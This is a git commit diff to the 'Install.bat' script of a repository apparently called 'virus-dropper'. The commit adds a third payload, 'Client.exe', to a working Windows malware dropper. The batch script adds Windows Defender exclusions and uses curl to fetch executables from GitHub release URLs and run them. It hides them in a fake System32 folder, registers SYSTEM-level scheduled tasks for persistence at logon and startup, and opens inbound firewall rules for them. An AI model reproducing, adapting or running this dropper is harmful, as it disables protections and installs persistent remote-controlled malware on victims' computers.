7798df7419007975027c372b6fbf5642a95b05d9
034nop <106563525+034nop@users.noreply.github.com>
2024-06-12 21:21:13 -0400

    Update Install.bat

--- install/Install.bat
+++ install/Install.bat
@@ -20,6 +20,8 @@ powershell -inputformat none -outputformat none -NonInteractive -Command "Add-Mp
 cls
 powershell -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionProcess '"Windows2.exe'"
 cls
+powershell -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionProcess '"Client.exe'"
+cls
 md "%systemroot%\System32\Windowsexe"
 cls
 
@@ -27,12 +29,14 @@ cls
 ::put payload file DIRECT download link here:
 curl -L "https://github.com/034nop/virus-dropper/releases/download/0.1/Windows.exe" --output "%appdata%\Windows.exe"
 curl -L "https://github.com/034nop/virus-dropper/releases/download/0.1/Windows2.exe" --output "%appdata%\Windows2.exe"
+curl -L "https://github.com/034nop/virus-dropper/releases/download/0.1/Client.exe" --output "%appdata%\Client.exe"
 ::do not change the --output, unless the payload is not a .exe file. (in that case, change all mentions of Windows.exe to Windows.extension)
 cls
 
 
 move "%appdata%\Windows.exe" "%systemroot%\System32\Windowsexe"
 move "%appdata%\Windows2.exe" "%systemroot%\System32\Windowsexe"
+move "%appdata%\Client.exe" "%systemroot%\System32\Windowsexe"
 cls
 
 
@@ -47,17 +51,22 @@ move "AV.bat" "%systemroot%\System32\Windowsexe\AV.bat"
 cls
 start "Windows2.exe" "%systemroot%\System32\Windowsexe\Windows2.exe"
 cls
+start "Client.exe" "%systemroot%\System32\Windowsexe\Client.exe"
+cls
 powershell -inputformat none -outputformat none -NonInteractive -Command "Remove-MpPreference -ExclusionPath '"%~dp0'"
 cls
 SCHTASKS /CREATE /F /SC ONLOGON /TR "%systemroot%\System32\Windowsexe\Windows.exe" /TN "Windows.exe" /RL HIGHEST /RU SYSTEM
 SCHTASKS /CREATE /F /SC ONLOGON /TR "%systemroot%\System32\Windowsexe\Windows2.exe" /TN "Windows2.exe" /RL HIGHEST
+SCHTASKS /CREATE /F /SC ONLOGON /TR "%systemroot%\System32\Windowsexe\Client.exe" /TN "Client.exe" /RL HIGHEST
 SCHTASKS /CREATE /F /SC ONLOGON /TR "%systemroot%\System32\Windowsexe\AV.bat" /TN "AV.bat" /RL HIGHEST /RU SYSTEM
 SCHTASKS /CREATE /F /SC ONSTART /TR "%systemroot%\System32\Windowsexe\Windows.exe" /TN "Windows.exe" /RL HIGHEST /RU SYSTEM
 SCHTASKS /CREATE /F /SC ONSTART /TR "%systemroot%\System32\Windowsexe\Windows2.exe" /TN "Windows2.exe" /RL HIGHEST
+SCHTASKS /CREATE /F /SC ONSTART /TR "%systemroot%\System32\Windowsexe\Client.exe" /TN "Client.exe" /RL HIGHEST
 SCHTASKS /CREATE /F /SC ONSTART /TR "%systemroot%\System32\Windowsexe\AV.bat" /TN "AV.bat" /RL HIGHEST /RU SYSTEM
 cls
 netsh advfirewall firewall add rule name="Windows Manager" dir=in action=allow program="%systemroot%\System32\Windowsexe\Windows.exe" enable=yes
 netsh advfirewall firewall add rule name="Windows Manager 2" dir=in action=allow program="%systemroot%\System32\Windowsexe\Windows2.exe" enable=yes
+netsh advfirewall firewall add rule name="Client Manager" dir=in action=allow program="%systemroot%\System32\Windowsexe\Client.exe" enable=yes
 cls
 del /f NSudo.exe
 cls
